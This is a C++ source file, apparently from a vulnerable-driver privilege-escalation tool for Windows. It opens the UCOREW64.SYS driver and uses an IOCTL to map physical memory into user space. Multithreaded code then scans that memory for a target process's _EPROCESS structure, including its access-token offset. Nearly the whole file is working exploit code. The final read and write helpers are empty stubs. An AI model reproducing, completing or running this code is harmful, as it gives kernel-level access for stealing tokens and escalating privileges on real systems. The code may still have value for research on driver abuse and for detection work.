#include "rw_primitive.h"
#include "windows_helper_functions.h"
#include <vector>
#include <thread>

using myNtMapViewOfSection = NTSTATUS(NTAPI*)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD64 InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect
	);
myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));

using myNtUnmapViewOfSection = NTSTATUS(NTAPI*)(
	HANDLE SectionHandle,
	PVOID BaseAddress
	);
myNtUnmapViewOfSection fNtUnmapViewOfSection = (myNtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));


BOOLEAN MapPhysicalMemory(HANDLE PhysicalMemory, __int64 Address, SIZE_T Length, PVOID* VirtualAddress)
{
	NTSTATUS			ntStatus;
	PHYSICAL_ADDRESS	SectionOffset;
	SectionOffset.QuadPart = (ULONGLONG)(Address);
	*VirtualAddress = 0;
	ntStatus = fNtMapViewOfSection // maybe wrong function call?
	(
		PhysicalMemory,
		GetCurrentProcess(),
		VirtualAddress,
		0L,
		Length,
		&SectionOffset,
		&Length,
		2,
		0,
		PAGE_READWRITE
	);
	if (!NT_SUCCESS(ntStatus)) return false;
	return true;
}

BOOLEAN UnmapPhysicalMemory(PVOID* buffer) {
	NTSTATUS	ntStatus;

	ntStatus = fNtUnmapViewOfSection
	(
		GetCurrentProcess(),
		*buffer
	);
	// returns STATUS_NOT_MAPPED_VIEW(0xC0000019)...
	if (!NT_SUCCESS(ntStatus)) return false;
	return true;
}

// returns 0 on success and saves handle to hPhysicalMemory
// return -1 on failure
int GetDevicePhysicalMemoryHandle(LPCWSTR driverName, HANDLE* hPhysicalMemory) {
	HANDLE device = INVALID_HANDLE_VALUE;
	NTSTATUS status = FALSE;
	DWORD bytesReturned = 0;


	device = CreateFileW(driverName, GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);

	if (device == INVALID_HANDLE_VALUE)
	{
		fprintf(stderr, "[!] Could not open device: 0x%lX\n", GetLastError());
		CloseHandle(device);
		return -1;
	}

	printf("[ ] Calling IOCTL_MapPhysicalMemoryToLinearSpace 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
	// UCOREW64.SYS SHA-256
	// a7c8f4faf3cbb088cac7753d81f8ec4c38ccb97cd9da817741f49272e8d01200
	status = DeviceIoControl(device,
		IOCTL_MapPhysicalMemoryToLinearSpace,
		&hPhysicalMemory,
		sizeof(hPhysicalMemory),
		&hPhysicalMemory,
		sizeof(hPhysicalMemory),
		&bytesReturned,
		(LPOVERLAPPED)NULL);

	if (status == FALSE) {
		fprintf(stderr, "[!] IOCTL_MapPhysicalMemoryToLinearSpace failed with %lX\n", status);
		CloseHandle(device);
		return -1;
	}


	printf("[*] IOCTL_MapPhysicalMemoryToLinearSpace 0x%X called successfully\n", IOCTL_MapPhysicalMemoryToLinearSpace);
	printf("[*] Buffer from the kernel land: %p", hPhysicalMemory);
	CloseHandle(device);

	return 0;
}

int searchPhysicalMemory(unsigned char* pattern, unsigned __int64 patternLength, HANDLE hPhysicalMemory, std::vector <unsigned __int64>& locations) {
	int memRegionsCount = -1;
	printf("[ ] Search for pattern: \"%s\"\n", pattern);

	// First get the count of the memory regions
	memRegionsCount = GetPhysicalMemoryLayout(NULL);
	if (memRegionsCount == -1) {
		fprintf(stderr, "[!] GetPhysicalMemoryLayout() failed.\n");
		return -1;
	}
	MEMORY_REGION* memRegion = (MEMORY_REGION*)calloc(memRegionsCount, sizeof(MEMORY_REGION));
	if (memRegion == NULL) {
		fprintf(stderr, "[!] calloc() failed.\n");
		return -1;
	}

	// Now store the memory regions into memRegion
	memRegionsCount = GetPhysicalMemoryLayout(memRegion);
	if (memRegionsCount == -1) {
		fprintf(stderr, "[!] GetPhysicalMemoryLayout() failed.\n");
		return -1;
	}
	if (memRegionsCount == 0) {
		fprintf(stderr, "[!] Found 0 memory regions.\n");
		return -1;
	}

	printf("[+] Found %d physical memory regions\n", memRegionsCount);
	for (int i = 0; i < memRegionsCount; i++) {
		printf("%p - %p\n", (void*)memRegion[i].address, (void*)(memRegion[i].address + memRegion[i].size));
	}
	printf("[ ]Scanning through each physical memory region...\n");

	PVOID* buf = (PVOID*)malloc(0x1000);
	if (buf == 0) {
		exit(EXIT_FAILURE);
	}

	PVOID* fourPages = (PVOID*)malloc(0x4000);
	if (fourPages == 0) {
		exit(EXIT_FAILURE);
	}
	unsigned int patternCount = 0;
	// go through mapped physical memory regions
	for (int i = 0; i < memRegionsCount; i++) {
		unsigned __int64 start = memRegion[i].address;
		unsigned __int64 end = memRegion[i].address + memRegion[i].size;
		printf("%p - %p\n", (void*)start, (void*)end);
		fflush(stdout);

		// go through each page in memory region
		for (unsigned __int64 page = start; page < end; page = page + 0x1000) {
			if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, page, 0x1000, buf) == FALSE) {
				fprintf(stderr, "[!] MapPhysicalMemory failed\n");
				free(fourPages);
				return -1;
			}
			PVOID castedBuf = *buf;

			// go through page byte by byte and search for pattern
			for (unsigned int offset = 0; offset < (0xfff - patternLength); offset++)
			{
				castedBuf = (unsigned char*)castedBuf + 1;
				if (memcmp(castedBuf, pattern, patternLength) == 0)
				{
					unsigned __int64 patternLocation = page + offset;
					locations.push_back(patternLocation);
					printf("[%d] Found pattern at: %p\n", patternCount, (void*)(page + offset));
					patternCount++;
				}
			}
			if (UnmapPhysicalMemory(buf) == FALSE) {
				printf("[!] UnmapPhysicalMemory failed\n");
				free(fourPages);
				return -1;
			}
		}
	}
	printf("[+] Scanned through every physical memory region\n");

	free(memRegion);
	free(fourPages);
	free(buf);
	return 0;
}

void GoThroughPages(const char* processName, int pid, HANDLE hPhysicalMemory,
	const unsigned int numThreads, std::vector<unsigned __int64>& locations, unsigned __int64 start, unsigned __int64 end)
{
	unsigned int patternLength = 16;
	unsigned int patternCount = 0;

	//UCHAR ImageFileName[15];
	unsigned char pattern[16] = { 0 };

	//UCHAR PriorityClass;
	pattern[15] = 0x02;

	// Copy processName into pattern
	for (int i = 0; i < 16; i++) {
		if (processName[i] == '\0') { break; }
		pattern[i] = processName[i];
	}

	const unsigned __int64 MEMORY_MAPED_SIZE = (unsigned __int64)0x1000 * 100;
	PVOID* buf = (PVOID*)malloc(MEMORY_MAPED_SIZE);
	if (buf == 0) {
		exit(EXIT_FAILURE);
	}
	PVOID* fourPages = (PVOID*)malloc(0x4000);
	if (fourPages == 0) {
		exit(EXIT_FAILURE);
	}

	unsigned __int64 maped_size = 0;
	unsigned __int64 offset_into_mapped_area = 0;
	// go through each page in memory region
	for (unsigned __int64 page = start; page < end; page += 0x1000)
	{
		if (maped_size % MEMORY_MAPED_SIZE == 0) {
			offset_into_mapped_area = 0;
			unsigned __int64 correct_MEMORY_MAPED_SIZE = MEMORY_MAPED_SIZE;
			if (page + MEMORY_MAPED_SIZE > end) {
				correct_MEMORY_MAPED_SIZE = MEMORY_MAPED_SIZE - (page + MEMORY_MAPED_SIZE - end);
			}
			if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, page, correct_MEMORY_MAPED_SIZE, buf) == FALSE) {
				fprintf(stderr, "[!] MapPhysicalMemory failed\n");
				free(fourPages);
				free(buf);
				//return -1; TODO: Error handling
				return;
			}
			//printf("Maped %p - %p\n", page, page + MEMORY_MAPED_SIZE);
		}
		PVOID castedBuf = *buf;
		castedBuf = (char*)castedBuf + offset_into_mapped_area;
		// go through page byte by byte and search for pattern
		for (unsigned int offset = 0; offset < (0xfff - patternLength); offset++)
		{
			if (memcmp(castedBuf, pattern, patternLength) == 0)
			{
				// Try mapping 4 pages so the struct can fit into the mapped region
				if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, page - 0x2000, 0x4000, fourPages) == FALSE) {
					fprintf(stderr, "[!] MapPhysicalMemory failed\n");
					free(fourPages);
					free(buf);
					//return -1; TODO: Error handling
					return;
				}

				PVOID castedFourPages = *fourPages;
				// get middle of fourPages
				castedFourPages = (unsigned char*)castedFourPages + 0x2000;
				// now castedFourPages and *buf point to the same memory
				// add pattern offset
				castedFourPages = (unsigned char*)castedFourPages + offset;

				unsigned char* EPROCESSBaseOfSystem = (unsigned char*)castedFourPages - _EPROCESS_ImageFileName_offset;
				unsigned char* UniqueProcessId = EPROCESSBaseOfSystem + _EPROCESS_UniqueProcessId_offset;
				unsigned char* Token = EPROCESSBaseOfSystem + _EPROCESS_Token_offset;
				// TODO: Check physical address ranges
				// Token check might not work as intended
				if (*(unsigned __int64*)UniqueProcessId == pid && *(unsigned __int64*)Token != 0)
				{
					void* physicalEPROCESSBase = (void*)(page + offset - _EPROCESS_ImageFileName_offset);
					printf("[%d] Found EPROCESS Base of \"%s\" at: %p\n", patternCount, processName, physicalEPROCESSBase);
					patternCount++;
					locations.push_back((unsigned __int64)physicalEPROCESSBase);
				}

				//memset(fourPages, 0, 0x4000); unnecessary
				if (UnmapPhysicalMemory(fourPages) == FALSE) {
					printf("[!] UnmapPhysicalMemory failed\n");
					//return -1; TODO: Error handling
					return;
				}
			}
			castedBuf = (unsigned char*)castedBuf + 1;
		}

		maped_size = maped_size + 0x1000;
		if (maped_size % MEMORY_MAPED_SIZE == 0)
		{
			offset_into_mapped_area = 0;
			//memset(buf, 0, MEMORY_MAPED_SIZE); unnecessary
			if (UnmapPhysicalMemory(buf) == FALSE) {
				printf("[!] UnmapPhysicalMemory failed\n");
				//return -1; TODO: Error handling
				return;
			}
			//printf("Unmap at page: %p\n", page);
		}
		offset_into_mapped_area += 0x1000;
	}
	free(fourPages);
	free(buf);
}

#define numThreads 4
unsigned __int64 GetEPROCESSPhysicalBase(const char* processName, int pid, HANDLE hPhysicalMemory, std::vector <unsigned __int64>& locations) {

	int memRegionsCount = -1;
	//UCHAR ImageFileName[15];
	unsigned char pattern[16] = { 0 };

	//UCHAR PriorityClass;
	pattern[15] = 0x02;

	// Copy processName into pattern
	for (int i = 0; i < 16; i++) {
		if (processName[i] == '\0') { break; }
		pattern[i] = processName[i];
	}

	memRegionsCount = GetPhysicalMemoryLayout(NULL);
	if (memRegionsCount == -1) {
		fprintf(stderr, "[!] GetPhysicalMemoryLayout() failed.\n");
		return -1;
	}
	MEMORY_REGION* memRegion = (MEMORY_REGION*)calloc(memRegionsCount, sizeof(MEMORY_REGION));
	if (memRegion == NULL) {
		fprintf(stderr, "[!] calloc() failed.\n");
		return -1;
	}
	memRegionsCount = GetPhysicalMemoryLayout(memRegion);
	if (memRegionsCount == -1) {
		fprintf(stderr, "[!] GetPhysicalMemoryLayout() failed.\n");
		return -1;
	}

	printf("[+] Found %d physical memory regions\n", memRegionsCount);

	if (memRegionsCount <= 3) {
		fprintf(stderr, "[!] Failed to get enough memory regions\n");
	}
	/*
	for (int i = 0; i < memRegionsCount; i++) {
		printf("%p - %p\n", (void*)memRegion[i].address, (void*)(memRegion[i].address + memRegion[i].size));
	}
	*/

	printf("[ ] Scanning through each physical memory region...\n");

	const unsigned __int64 MEMORY_MAPED_SIZE = (unsigned __int64)0x1000 * 100;
	PVOID* buf = (PVOID*)malloc(MEMORY_MAPED_SIZE);
	if (buf == 0) {
		exit(EXIT_FAILURE);
	}
	PVOID* fourPages = (PVOID*)malloc(0x4000);
	if (fourPages == 0) {
		exit(EXIT_FAILURE);
	}

	// go through mapped physical memory regions backwards as _EPROCESS is probabilistically at higher addresses
	for (int i = memRegionsCount - 1; i >= 0; i--) {
		unsigned __int64 start = memRegion[i].address;
		unsigned __int64 end = memRegion[i].address + memRegion[i].size;
		printf("%p - %p\n", (void*)start, (void*)end);
		fflush(stdout);

		// Multithreading
		std::vector<std::thread> threads;
		std::vector<unsigned __int64> accLocations[numThreads];

		// Start threads
		for (int threadNumber = 0; threadNumber < numThreads; threadNumber++)
		{
			threads.push_back(std::thread(
				GoThroughPages, processName, pid,
				hPhysicalMemory, numThreads, std::ref(accLocations[threadNumber]),
				start + (threadNumber * 0x1000), end));
		}
		// Join threads
		for (std::thread& t : threads)
		{
			if (t.joinable()) {
				t.join();
				// TODO: error handling
			}
		}

		for (int j = 0; j < numThreads; j++) {
			locations.insert(locations.end(), accLocations[j].begin(), accLocations[j].end());
		}
	}
	printf("[+] Scanned through every physical memory region\n");

	free(memRegion);
	free(fourPages);
	free(buf);
	return 0;
}

int readPhysical(unsigned __int64 address, const void* buf, size_t count)
{
	return 0;
}

int writePhysical(unsigned __int64 address, const void* buf, size_t count)
{
	return 0;
}